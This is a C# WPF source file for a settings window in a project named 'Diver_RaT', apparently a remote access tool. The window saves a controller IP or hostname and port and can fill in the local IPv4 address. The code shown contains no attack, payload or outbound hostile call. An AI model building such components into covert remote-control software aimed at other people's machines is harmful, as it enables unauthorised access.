using System;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Windows;

namespace Diver_RaT
{
    public partial class EndpointSetupWindow : Window
    {
        public EndpointSetupWindow()
        {
            InitializeComponent();
            IpTextBox.Text = string.IsNullOrWhiteSpace(ControllerSettings.Ip)
                ? GetLocalIpv4()
                : ControllerSettings.Ip;
            PortTextBox.Text = ControllerSettings.Port.ToString(System.Globalization.CultureInfo.InvariantCulture);
            Loaded += (_, _) => ContinueButton.Focus();
        }

        private void LocalIpButton_Click(object sender, RoutedEventArgs e)
        {
            IpTextBox.Text = GetLocalIpv4();
        }

        private void SkipButton_Click(object sender, RoutedEventArgs e) => Close();

        private void ContinueButton_Click(object sender, RoutedEventArgs e)
        {
            if (TrySave()) Close();
        }

        private bool TrySave()
        {
            var ip = IpTextBox.Text.Trim();
            if (string.IsNullOrWhiteSpace(ip))
            {
                StatusNote(IpTextBox, "Enter the controller IP or hostname.");
                return false;
            }
            if (!int.TryParse(PortTextBox.Text.Trim(), out int port) || port is < 1 or > 65535)
            {
                StatusNote(PortTextBox, "Port must be between 1 and 65535.");
                return false;
            }
            ControllerSettings.Save(ip, port);
            return true;
        }

        private void StatusNote(System.Windows.Controls.TextBox box, string message)
        {
            box.Focus();
            box.SelectAll();
            ErrorNote.Text = message;
            ErrorNote.Visibility = Visibility.Visible;
        }

        private static string GetLocalIpv4()
        {
            try
            {
                var host = Dns.GetHostEntry(Dns.GetHostName());
                var ip = host.AddressList.FirstOrDefault(a =>
                    a.AddressFamily == AddressFamily.InterNetwork && !IPAddress.IsLoopback(a));
                return ip?.ToString() ?? "127.0.0.1";
            }
            catch
            {
                return "127.0.0.1";
            }
        }
    }
}